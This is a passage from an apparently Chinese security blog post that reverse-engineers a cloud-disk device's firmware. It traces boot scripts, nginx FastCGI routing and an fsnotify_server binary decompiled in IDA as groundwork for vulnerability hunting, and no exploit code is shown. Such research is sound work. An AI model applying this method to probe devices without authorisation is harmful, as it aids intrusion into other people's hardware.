class="line">  cnt=0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">cnt=`<span class="built_in">expr</span> <span class="variable">$&#123;cnt&#125;</span> + 1`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cnt</span> &gt; /root/.reboot</span><br><span class="line">ifconfig | grep wlan0</span><br><span class="line"><span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;###############################REBOOT##############################&quot;</span><span class="variable">$&#123;cnt&#125;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;###############################REBOOT##############################&quot;</span><span class="variable">$&#123;cnt&#125;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;###############################REBOOT##############################&quot;</span><span class="variable">$&#123;cnt&#125;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;###############################REBOOT##############################&quot;</span><span class="variable">$&#123;cnt&#125;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;###############################REBOOT##############################&quot;</span><span class="variable">$&#123;cnt&#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$&#123;cnt&#125;</span> -lt 10 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">sleep</span> 1</span><br><span class="line">    reboot -f</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[ERROR]#######cnt &gt; 10, give up reboot, wlan0 is not up#########&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;0&quot;</span> &gt; /root/.reboot</span><br><span class="line"></span><br><span class="line">mac=`ifconfig eth0 | grep HWaddr | awk &#123;<span class="string">&#x27;print $5&#x27;</span>&#125;`</span><br><span class="line">device_search_server <span class="string">&quot;mac:&quot;</span><span class="variable">$&#123;mac&#125;</span> &amp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$RUNLEVEL</span> = 4 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Extract MicroHei.ttf to /var&quot;</span></span><br><span class="line">    tar xzf /hybroad/share/MicroHei.ttf.tar.gz -C /var</span><br><span class="line">    <span class="comment"># Start telnetd or sshd service</span></span><br><span class="line">    <span class="keyword">if</span> [ -x /usr/sbin/sshd ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Start ssh service ...&quot;</span></span><br><span class="line">        /usr/sbin/sshd</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Can not find ssh server, then use telnet server ...&quot;</span></span><br><span class="line">        telnetd 2&gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="comment"># Back upgrade tool</span></span><br><span class="line">    <span class="keyword">if</span> [ -x /hybroad/bin/back_upgrade.elf ]; <span class="keyword">then</span></span><br><span class="line">        /hybroad/bin/back_upgrade.elf &amp;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -n <span class="variable">$RUNLEVEL</span> ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cd</span> /hybroad/bin</span><br><span class="line">    <span class="keyword">while</span> [ 1 ]; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$RUNLEVEL</span> <span class="keyword">in</span></span><br><span class="line">    4)</span><br><span class="line">        <span class="built_in">echo</span> Starting factory <span class="built_in">test</span> ...</span><br><span class="line">        <span class="keyword">if</span> [ -f /root/eWindow/eWindow.elf ]; <span class="keyword">then</span></span><br><span class="line">            /root/eWindow/eWindow.elf</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            /hybroad/bin/eWindow.elf</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="keyword">if</span> [ -x /hybroad/user.rc ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> Starting user.rc ...</span><br><span class="line">            /hybroad/user.rc</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ifconfig eth0 10.0.0.188 broadcast 10.255.255.255 netmask 255.0.0.0</span><br><span class="line">            <span class="comment"># Mount /var</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Mount var as 80M&quot;</span></span><br><span class="line">            mount -nt tmpfs -o size=80M,mode=777 tmpfs /var</span><br><span class="line">            <span class="built_in">cd</span> /var</span><br><span class="line">            <span class="built_in">mkdir</span> lib lib/bluetooth lock <span class="built_in">log</span> run tmp dhcpc empty empty/sshd db</span><br><span class="line">            <span class="built_in">touch</span> run/utmp <span class="built_in">log</span>/wtmp</span><br><span class="line">            <span class="built_in">chmod</span> 755 empty</span><br><span class="line">            <span class="built_in">cd</span> -</span><br><span class="line">            <span class="comment"># Extract MicroHei.ttf</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Extract MicroHei.ttf to /var&quot;</span></span><br><span class="line">            tar xzf /hybroad/share/MicroHei.ttf.tar.gz -C /var</span><br><span class="line">            <span class="comment"># Start telnetd or sshd service</span></span><br><span class="line">            <span class="keyword">if</span> [ -x /usr/sbin/sshd ]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Start ssh service ...&quot;</span></span><br><span class="line">                /usr/sbin/sshd</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Can not find ssh server, then use telnet server ...&quot;</span></span><br><span class="line">                telnetd 2&gt;/dev/null</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>在这个脚本中也启动了更多的进程，如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -x /hybroad/user.rc ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> Starting user.rc ...</span><br><span class="line">    /hybroad/user.rc</span><br></pre></td></tr></table></figure><p>local.rc顺便启动了&#x2F;hybroad&#x2F;user.rc，user.rc用于启动用户服务，由于user.rc内容太长，在这里只截取一些我们感兴趣的部分</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809181436931.png" alt="image-20230809181436931"></p><p>user.rc中启动了nginx服务。</p><h2 id="什么是nginx？"><a href="#什么是nginx？" class="headerlink" title="什么是nginx？"></a>什么是nginx？</h2><p><strong>Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器。</strong></p><p>HTTP服务器我们都知道是什么，那么什么是反向代理web服务器？</p><p>首先，有反向就肯定有正向，我们先来看看正向代理服务器。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/1.png" alt="1"></p><p><strong>正向代理：</strong> 我们平时需要访问国外的浏览器是不是很慢，比如我们要看推特，看GitHub等等。我们直接用国内的服务器无法访问国外的服务器，或者是访问很慢。所以我们需要在本地搭建一个服务器来帮助我们去访问。那这种就是正向代理。<strong>正向代理“代理”的是客户端，而且客户端是知道目标的，而目标是不知道客户端是通过VPN访问的。</strong></p><p>再看到反向代理：</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/2.png" alt="2"></p><p><strong>反向代理</strong>：那什么是反向代理呢。比如：我们访问淘宝的时候，淘宝内部肯定不是只有一台服务器，它的内部有很多台服务器，那我们进行访问的时候，因为服务器中间session不共享，那我们是不是在服务器之间访问需要频繁登录，那这个时候淘宝搭建一个过渡服务器，对我们是没有任何影响的，我们是登录一次，但是访问所有，这种情况就是 反向代理。<strong>反向代理“代理”的是服务端，对于客户端是透明的，客户端是不知道服务器内部使用了代理的，我们只需要将数据发送给服务器，由服务端进行选择即可。</strong></p><p>而nginx就是实现反向代理的一个服务器，能够将不同的数据转发给不同的服务进行处理。</p><p>nginx的配置文件为nginx.conf，路径为<code>/usr/local/nginx/conf</code>，这个配置文件一共由三部分组成，分别为<strong>全局块、events块和http块</strong>。在http块中，又包含http全局块、多个server块。每个server块中，可以包含server全局块和多个location块。在同一配置块中嵌套的配置块，各个之间不存在次序关系。</p><p>大致结构如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809184814436.png" alt="image-20230809184814436"></p><p>我们重点关注http块</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810122954192.png" alt="image-20230810122954192"></p><p>这里定义了http服务</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810123051866.png" alt="image-20230810123051866"></p><p>定义了https服务</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810123256608.png" alt="image-20230810123256608"></p><p>在这里监听了一些自定义端口，6900，6901。用于处理baiduyunpan.com域名下的请求。</p><p>该服务器块监听端口为6900，当收到请求时，根据请求路径进行不同的处理。</p><ul><li><code>/fsnotify</code>：当请求路径为&#x2F;fsnotify时，会执行FastCGI处理。使用include指令引入fastcgi_params配置文件，指定fastcgi_pass指令将请求转发给Unix域套接字<code>/tmp/fsnotify.sock</code>上的FastCGI后端。</li><li><code>/eshell</code>：当请求路径为&#x2F;eshell时，同样执行FastCGI处理。使用include指令引入fastcgi_params配置文件，指定fastcgi_pass指令将请求转发给Unix域套接字<code>/tmp/http_eshell.sock</code>上的FastCGI后端。</li><li><code>/baiduyunpan</code>：当请求路径为&#x2F;baiduyunpan时，执行FastCGI处理。同样使用include指令引入fastcgi_params配置文件，指定fastcgi_pass指令将请求转发给Unix域套接字<code>/tmp/baiduyunpan.sock</code>上的FastCGI后端。</li><li><code>/</code>：当请求路径不匹配以上任何规则时，执行默认的FastCGI处理。同样使用include指令引入fastcgi_params配置文件，指定fastcgi_pass指令将请求转发给Unix域套接字<code>/tmp/baiduyunpan.sock</code>上的FastCGI后端。</li></ul><p>我们看看<code>fsnotify.sock</code>上定义的后端是什么</p><p>使用如下方法命令进行全局查找</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">squashfs-root$ grep -r <span class="string">&quot;fsnotify.sock&quot;</span></span><br><span class="line">usr/local/nginx/conf/nginx.conf:        fastcgi_pass unix:/tmp/fsnotify.sock; </span><br><span class="line">usr/local/nginx/conf/nginx.conf:        fastcgi_pass unix:/tmp/fsnotify.sock; </span><br><span class="line">bin/fsnotify_guard.sh:  spawn-fcgi -n -s /tmp/fsnotify.sock -f <span class="string">&quot;/usr/sbin/fsnotify_server <span class="variable">$1</span> <span class="variable">$2</span>&quot;</span></span><br></pre></td></tr></table></figure><p>可以看到除了<code>nginx.conf</code>之中使用了fsnotify.sock，在<code>fsnotify_guard.sh</code>中也引用了fsnotify.sock，我们继续查找<code>fsnotify_guard.sh</code>在何处被调用了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">squashfs-root$ grep -r <span class="string">&quot;fsnotify_guard.sh&quot;</span></span><br><span class="line">usr/sbin/mqtt_run.sh:fsnotify_guard.sh <span class="variable">$&#123;name&#125;</span> <span class="variable">$&#123;psw&#125;</span> &amp;</span><br></pre></td></tr></table></figure><p><code>mqtt_run.sh</code>之中调用了<code>fsnotify_guard.sh</code></p><p>而在user.rc中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810124131527.png" alt="image-20230810124131527"></p><p>调用了<code>mqtt_run.sh</code>。</p><p>从上面的分析可以看出，访问6900端口的&#x2F;fsnotify路径会给到<code>/usr/sbin/fsnotify_server</code>进行处理。</p><p>同理，&#x2F;eshell，&#x2F;baiduyunpan也都有对应的server进行处理，这些服务在user.rc中就启动了。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810125906670.png" alt="image-20230810125906670"></p><p>到现在我们就大致理清了这个设备的运行流程：以nginx作为服务器，用户通过手机app控制云盘，不同的功能发包的目标端口不同，且访问路径不同，nginx通过访问路径和端口号来决定要使用哪个服务来处理访问请求。</p><p>我们可以通过burp抓包来确认自己的想法，毕竟这只是纯粹的静态分析，正不正确还不一定。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814145646572.png" alt="image-20230814145646572"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814145702905.png" alt="image-20230814145702905"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230814145739491.png" alt="image-20230814145739491"></p><h1 id="4-漏洞挖掘"><a href="#4-漏洞挖掘" class="headerlink" title="4.漏洞挖掘"></a>4.漏洞挖掘</h1><p>由于服务众多，本着自定义服务都可以挖的原则，直接从第一个<code>fsnotify_server</code>下手</p><p>main函数长这样</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810131632105.png" alt="image-20230810131632105"></p><p>开头这几个<code>mosquitto</code>开头的函数，是mosquitto这个工具的api，mosquitto是什么？</p><p><strong>Mosquitto是一个开源的MQTT消息代理（broker），用于支持MQTT协议的消息传递。</strong></p><p>那么，MQTT是什么？</p><p>MQTT（Message Queuing Telemetry Transport）是一种轻量级的发布&#x2F;订阅消息传递协议，最初由IBM开发，并广泛用于物联网（IoT）应用中的设备间通信。它的设计目标是在低带宽和不稳定网络环境下，提供高效的消息传递机制。</p><p>其大致架构如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/3.png" alt="3"></p><p>发布者发布某个主题的消息，订阅者订阅某个主题的消息。</p><p>举个例子，比如发布者想要发布主题为“温度”的消息，如果订阅者想要接收到发布者发布的温度信息，那么就需要先在broker中订阅温度主题，这样当主题为温度的数据发送给broker时，broker就会将温度的信息转发给所有订阅了温度主题的订阅者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mosquitto_new用于创建一个新的mqtt客户端</span><br><span class="line">mosquitto_username_pw_set用于设置Mosquitto客户端连接到MQTT代理所需的用户名和密码</span><br><span class="line">mosquitto_connect_callback_set用于设置当客户端成功连接到MQTT代理时的回调函数</span><br><span class="line">mosquitto_message_callback_set用于设置当接收到消息时的回调函数</span><br><span class="line">mosquitto_connect用于连接Mosquitto客户端到指定的MQTT代理</span><br><span class="line">mosquitto_loop_start 是一个 Mosquitto 库函数，用于启动一个线程，使 Mosquitto 客户端实例可以在后台循环处理网络和消息事件</span><br></pre></td></tr></table></figure><p>main函数整体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">pthread_t</span> newthread; <span class="comment">// [sp+10h] [bp-24h] BYREF</span></span><br><span class="line">  _DWORD *i; <span class="comment">// [sp+14h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> *newa; <span class="comment">// [sp+18h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+1Ch] [bp-18h]</span></span><br><span class="line">  FILE *v10; <span class="comment">// [sp+20h] [bp-14h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [sp+24h] [bp-10h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+28h] [bp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+2Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_12FF4();</span><br><span class="line">  mosq = mosquitto_new(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);<span class="comment">//创建一个新的mqtt客户端</span></span><br><span class="line">  mosquitto_username_pw_set(mosq, a2[<span class="number">1</span>], a2[<span class="number">2</span>]);<span class="comment">//设置连接用户名和密码</span></span><br><span class="line">  mosquitto_connect_callback_set(mosq, sub_14988);<span class="comment">//设置连接成功时的回调函数</span></span><br><span class="line">  mosquitto_message_callback_set(mosq, sub_147F0);<span class="comment">//设置接收到消息时的回调函数</span></span><br><span class="line">  <span class="keyword">if</span> ( mosquitto_connect(mosq, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1883</span>, <span class="number">120</span>) )<span class="comment">//连接mqtt代理</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( off_44A8C )</span><br><span class="line">    &#123;</span><br><span class="line">      stream = (FILE *)fopen64(off_44A8C, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( stream )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(</span><br><span class="line">          stream,</span><br><span class="line">          <span class="string">&quot;time:%s, file:%s, line:%d, func:%s, info:mqtt connect failed\n&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Wed Oct 19 09:29:28 2022&quot;</span>,</span><br><span class="line">          <span class="string">&quot;server.c&quot;</span>,</span><br><span class="line">          <span class="number">1716</span>,</span><br><span class="line">          <span class="string">&quot;main&quot;</span>);</span><br><span class="line">        v12 = ftell(stream);</span><br><span class="line">        fclose(stream);</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt; <span class="number">0x800000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v3 = <span class="built_in">strlen</span>(off_44A8C);</span><br><span class="line">          s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v3 + <span class="number">2</span>);</span><br><span class="line">          <span class="built_in">sprintf</span>(s, <span class="string">&quot;%s0&quot;</span>, off_44A8C);</span><br><span class="line">          rename(off_44A8C, s);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( mosquitto_loop_start(mosq) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( off_44A8C )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = (FILE *)fopen64(off_44A8C, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(</span><br><span class="line">          v10,</span><br><span class="line">          <span class="string">&quot;time:%s, file:%s, line:%d, func:%s, info:mosq_loop_start failed\n&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Wed Oct 19 09:29:28 2022&quot;</span>,</span><br><span class="line">          <span class="string">&quot;server.c&quot;</span>,</span><br><span class="line">          <span class="number">1721</span>,</span><br><span class="line">          <span class="string">&quot;main&quot;</span>);</span><br><span class="line">        v9 = ftell(v10);</span><br><span class="line">        fclose(v10);</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt; <span class="number">0x800000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="built_in">strlen</span>(off_44A8C);</span><br><span class="line">          newa = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v4 + <span class="number">2</span>);</span><br><span class="line">          <span class="built_in">sprintf</span>(newa, <span class="string">&quot;%s0&quot;</span>, off_44A8C);</span><br><span class="line">          rename(off_44A8C, newa);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    pthread_create(&amp;newthread, <span class="number">0</span>, (<span class="type">void</span> *(*)(<span class="type">void</span> *))start_routine, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = sub_2E21C(<span class="number">64</span>, (<span class="type">int</span>)sub_19600, (<span class="type">int</span>)sub_19758, <span class="number">0</span>); ; sub_2E2AC(i, <span class="number">-1</span>) )<span class="comment">//最后得执行这个奇怪的for循环</span></span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到<code>sub_2E21C</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810150210199.png" alt="image-20230810150210199"></p><p>都是赋值的操作，意义不明，只看到最后一个<code>FCGX_Init</code>函数。</p><p>再看到<code>sub_19600</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810152643683.png" alt="image-20230810152643683"></p><p>也使用了FCGX_FPrintF。</p><p>谷歌一下。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810151240397.png" alt="image-20230810151240397"></p><p>下载源码编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir install</span><br><span class="line">./configure --prefix=./install</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810153307313.png" alt="image-20230810153307313"></p><p>然后生成这3个目录，我们看到lib目录</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810153357415.png" alt="image-20230810153357415"></p><p>用IDA打开<code>libfcgi.so.0.0.0</code>这个文件</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810153916041.png" alt="image-20230810153916041"></p><p>然后生成C头文件</p><p>然后再载入头文件</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810154351851.png" alt="image-20230810154351851"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810154506619.png" alt="image-20230810154506619"></p><p>可以看到导入了不少结构体，接下来我们来恢复一下函数的参数，方便我们查看</p><p>比如这个<code>FCGX_FPrintF</code>，第一个参数看起来是个结构体，</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230810155052528.png" alt="image-20230810155052528"></p><p>其函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FCGX_FPrintF</span><span class="params">(FCGX_Stream *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span></span><br></pre></td></tr></table></figure><p>还有下面的</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811123209846.png" alt="image-20230811123209846"></p><p>函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">FCGX_GetParam</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, FCGX_ParamArray envp)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">FCGX_GetStr</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> n, FCGX_Stream *stream)</span>;</span><br></pre></td></tr></table></figure><p>但是注意到在伪代码中FCGX_GetParam和FCGX_GetStr的参数都是<code>a1+x</code>的形式，也就是说FCGX_GetParam和FCGX_GetStr的参数都是a1中的某个成员，即FCGX_ParamArray和FCGX_Stream这两个结构体指针是另外一个结构体的成员。</p><p>在源码中进行查找，找到了符合的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FCGX_Request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> requestId;            <span class="comment">/* valid if isBeginProcessed */</span></span><br><span class="line">    <span class="type">int</span> role;</span><br><span class="line">    FCGX_Stream *in;</span><br><span class="line">    FCGX_Stream *out;</span><br><span class="line">    FCGX_Stream *err;</span><br><span class="line"><span class="type">char</span> **envp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don&#x27;t use anything below here */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Params</span> *<span class="title">paramsPtr</span>;</span></span><br><span class="line">    <span class="type">int</span> ipcFd;               <span class="comment">/* &lt; 0 means no connection */</span></span><br><span class="line">    <span class="type">int</span> isBeginProcessed;     <span class="comment">/* FCGI_BEGIN_REQUEST seen */</span></span><br><span class="line">    <span class="type">int</span> keepConnection;       <span class="comment">/* don&#x27;t close ipcFd at end of request */</span></span><br><span class="line">    <span class="type">int</span> appStatus;</span><br><span class="line">    <span class="type">int</span> nWriters;             <span class="comment">/* number of open writers (0..2) */</span></span><br><span class="line"><span class="type">int</span> flags;</span><br><span class="line"><span class="type">int</span> listen_sock;</span><br><span class="line">&#125; FCGX_Request;</span><br></pre></td></tr></table></figure><p>将a1重新设置类型，如下图所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811124016748.png" alt="image-20230811124016748"></p><p>FCGX_GetParam和FCGX_GetStr的参数都已发生了变化</p><p>再对其他fcgi的函数进行一些参数修改即可。</p><p>再回头看main</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811125436995.png" alt="image-20230811125436995"></p><p>修改之后的for循环发生了一点变化，还是看到<code>sub_19600</code>函数</p><p>先看到<code>sub_2E428</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811125913848.png" alt="image-20230811125913848"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811125644886.png" alt="image-20230811125644886"></p><p>获取<code>CONTENT_LENGTH</code>的值，然后再获取contentlength长度的content</p><p>将函数的变量和函数名重命名一下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811125823240.png" alt="image-20230811125823240"></p><p>最后返回的是存储着content的数据的堆块的指针。</p><p>再看到<code>sub_1BA4C</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811130322885.png" alt="image-20230811130322885"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230811130414701.png" alt="image-20230811130414701"></p><p>出现了另一个函数<code>protobuf_c_message_unpack</code></p><p>这个函数属于一个反序列化框架protobuf</p><p><strong>Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的序列化结构的数据格式，用于将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构。</strong></p><p>protobuf支持许多语言，其中就包含c语言。protobuf-c也是开源的，既然是开源的，我们也还是扒拉下源码然后编译，然后导入结构体，以便于我们逆向分析。</p><p>安装protobuf-c之前需要先安装protobuf</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install autoconf automake libtool curl make g++ unzip -y</span><br><span class="line">wget https://github.com/protocolbuffers/protobuf/releases/download/v21.11/protobuf-all-21.11.zip</span><br><span 